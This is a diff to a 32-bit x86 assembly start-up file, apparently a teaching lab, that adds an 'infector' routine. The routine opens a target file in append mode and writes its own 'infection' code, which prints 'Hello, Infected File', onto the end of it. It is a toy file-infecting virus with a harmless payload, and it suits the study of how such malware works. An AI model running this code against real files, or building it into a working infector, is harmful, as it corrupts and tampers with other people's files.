@@ -1,7 +1,11 @@
+section	.rodata						; we define (global) read-only variables in .rodata section
+	hello_string: db "Hello, Infected File", 0xA
 section .text
-global _start
-global system_call
-extern main
+    global _start
+    global system_call
+    global infection
+    global infector
+    extern main
 _start:
     pop    dword ecx    ; ecx = argc
     mov    esi,esp      ; esi = argv
@@ -38,3 +42,57 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
+
+code_start:
+    infection:
+        push    ebp            
+        mov     ebp, esp
+        sub     esp, 4
+        pushad
+        mov eax, 4
+        mov ebx, 1
+        mov ecx, hello_string
+        mov edx, 22
+        int 0x80
+        mov [ebp-4], eax
+        popad
+        mov eax, [ebp-4]
+        add esp, 4
+        pop ebp
+        ret
+
+code_end:
+
+    infector:
+        push    ebp            
+        mov     ebp, esp
+        sub     esp, 4
+        pushad
+
+        mov eax, 5
+        mov ebx, [ebp+8]
+        mov ecx, 1025
+        mov edx, 0x777
+        int 0x80            ;system call (open with append)
+
+        mov esi, eax
+        mov eax, 4
+        mov ebx, esi
+        mov ecx, code_start
+        mov edx, code_end
+        sub edx, code_start 
+        int 0x80            ;system call (write append)
+        
+        mov eax, 6
+        mov ebx, esi
+        int 0x80            ;system call (close)
+
+        mov [ebp-4], eax
+        popad
+        mov eax, [ebp-4]
+        add esp, 4
+        pop ebp
+        ret
+
+
+
